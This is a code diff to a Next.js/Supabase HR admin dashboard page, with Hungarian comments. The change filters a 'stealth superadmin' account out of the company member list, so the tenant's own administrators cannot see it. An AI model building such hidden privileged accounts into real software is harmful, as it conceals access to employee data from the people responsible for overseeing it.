@@ -10,6 +10,7 @@ import { KpiCard } from "@/components/kpi-card"
 import Link from "next/link"
 import { createClient } from "@/utils/supabase/server"
 import { getActiveCompanyIdServer, getActiveCompanyMemberRolesServer } from "@/utils/company-server"
+import { isStealthSuperadmin, STEALTH_SUPERADMIN_ID } from "@/utils/stealth-superadmin"
 import { createClient as createAdminClient } from "@supabase/supabase-js"
 import { redirect } from "next/navigation"
 
@@ -62,12 +63,14 @@ export default async function HrAdminPage() {
   thirtyDaysFromNow.setDate(today.getDate() + 30)
   const thirtyDaysStr = thirtyDaysFromNow.toISOString().split("T")[0]
 
-  // Aktív cég tagjainak azonosítói
+  // Aktív cég tagjainak azonosítói (rejtett rendszerfiók nélkül)
   const { data: companyMembers } = await supabaseAdmin
     .from("company_members")
     .select("user_id, role, hr_szerepkor")
     .eq("company_id", companyScope)
-  const memberUserIds = (companyMembers || []).map(m => m.user_id)
+  const memberUserIds = (companyMembers || [])
+    .map(m => m.user_id)
+    .filter(uid => uid !== STEALTH_SUPERADMIN_ID && !isStealthSuperadmin({ id: uid }))
   const safeMemberIds = memberUserIds.length > 0 ? memberUserIds : ["00000000-0000-0000-0000-000000000000"]
 
   // Párhuzamos adatlekérések az állományhoz és a teendőkhöz (minden lekérdezés a jogosultság-ellenőrzött supabaseAdmin klienssel és céges szűréssel)
